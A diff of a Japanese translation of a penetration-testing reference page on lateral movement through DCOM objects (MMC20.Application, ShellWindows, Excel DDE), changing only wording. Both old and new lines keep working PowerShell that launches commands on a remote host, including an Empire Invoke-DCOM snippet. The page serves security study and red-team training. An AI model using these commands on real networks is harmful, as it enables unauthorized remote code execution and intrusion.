@@ -6,11 +6,11 @@
 
 **この技術に関する詳細は、[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)の元の投稿を確認してください。**
 
-Distributed Component Object Model (DCOM) オブジェクトは、オブジェクトとのネットワークベースの相互作用に対して興味深い機能を提供します。Microsoftは、DCOMおよびComponent Object Model (COM)に関する包括的なドキュメントを提供しており、[こちらでDCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx)と[こちらでCOM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)にアクセスできます。DCOMアプリケーションのリストは、PowerShellコマンドを使用して取得できます:
+分散コンポーネントオブジェクトモデル（DCOM）オブジェクトは、オブジェクトとのネットワークベースの相互作用に対して興味深い機能を提供します。Microsoftは、DCOMおよびコンポーネントオブジェクトモデル（COM）に関する包括的なドキュメントを提供しており、[DCOMについてはこちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx)および[COMについてはこちら](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)でアクセスできます。DCOMアプリケーションのリストは、PowerShellコマンドを使用して取得できます：
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-COMオブジェクト、[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)は、MMCスナップイン操作のスクリプトを可能にします。特に、このオブジェクトには`Document.ActiveView`の下に`ExecuteShellCommand`メソッドが含まれています。このメソッドに関する詳細情報は[こちら](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)で確認できます。実行してみてください：
+COMオブジェクト、[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)は、MMCスナップイン操作のスクリプトを可能にします。特に、このオブジェクトには`Document.ActiveView`の下に`ExecuteShellCommand`メソッドが含まれています。このメソッドに関する詳細情報は[こちら](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)で確認できます。実行を確認してください：
 
 この機能は、DCOMアプリケーションを介してネットワーク上でコマンドを実行することを容易にします。管理者としてDCOMにリモートで対話するために、PowerShellを次のように利用できます：
 ```powershell
@@ -42,20 +42,20 @@ ls \\10.10.10.10\c$\Users
 
 ### ShellWindows
 
-ProgID が欠如している `ShellWindows` に対して、.NET メソッド `Type.GetTypeFromCLSID` と `Activator.CreateInstance` を使用して、その AppID を用いてオブジェクトのインスタンス化を行います。このプロセスでは、OleView .NET を利用して `ShellWindows` の CLSID を取得します。インスタンス化された後は、`WindowsShell.Item` メソッドを通じて相互作用が可能で、`Document.Application.ShellExecute` のようなメソッド呼び出しが行えます。
+ProgID が欠如している `ShellWindows` に対しては、.NET メソッド `Type.GetTypeFromCLSID` と `Activator.CreateInstance` を使用して、その AppID を用いてオブジェクトのインスタンス化を行います。このプロセスでは、OleView .NET を利用して `ShellWindows` の CLSID を取得します。インスタンス化された後は、`WindowsShell.Item` メソッドを通じて相互作用が可能で、`Document.Application.ShellExecute` のようなメソッド呼び出しが行えます。
 
-オブジェクトをインスタンス化し、リモートでコマンドを実行するための PowerShell コマンドの例が提供されました:
+オブジェクトをインスタンス化し、リモートでコマンドを実行するための PowerShell コマンドの例が提供されました：
 ```powershell
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
-### Lateral Movement with Excel DCOM Objects
+### Excel DCOMオブジェクトを使用した横移動
 
-ラテラルムーブメントは、DCOM Excelオブジェクトを悪用することで達成できます。詳細な情報については、[Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)でのDCOMを介したラテラルムーブメントのためのExcel DDEの活用に関する議論を読むことをお勧めします。
+横移動は、DCOM Excelオブジェクトを悪用することで実現できます。詳細な情報については、[Cybereasonのブログ](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)でのDCOMを介した横移動のためのExcel DDEの活用に関する議論を読むことをお勧めします。
 
-Empireプロジェクトは、DCOMオブジェクトを操作することによってExcelを使用したリモートコード実行（RCE）を示すPowerShellスクリプトを提供しています。以下は、[Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)で入手可能なスクリプトからのスニペットで、RCEのためにExcelを悪用するさまざまな方法を示しています：
+Empireプロジェクトは、DCOMオブジェクトを操作することによってExcelを使用したリモートコード実行（RCE）を示すPowerShellスクリプトを提供しています。以下は、[EmpireのGitHubリポジトリ](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)で入手可能なスクリプトのスニペットで、RCEのためにExcelを悪用するさまざまな方法を示しています：
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -82,7 +82,7 @@ $Obj.DDEInitiate("cmd", "/c $Command")
 
 これらの技術を自動化するために2つのツールが強調されています：
 
-- **Invoke-DCOM.ps1**: リモートマシンでコードを実行するためのさまざまなメソッドの呼び出しを簡素化するEmpireプロジェクトによって提供されたPowerShellスクリプト。このスクリプトはEmpire GitHubリポジトリで入手可能です。
+- **Invoke-DCOM.ps1**: リモートマシンでコードを実行するためのさまざまなメソッドの呼び出しを簡素化するEmpireプロジェクトによって提供されるPowerShellスクリプト。このスクリプトはEmpire GitHubリポジトリで入手可能です。
 
 - **SharpLateral**: リモートでコードを実行するために設計されたツールで、次のコマンドで使用できます：
 ```bash
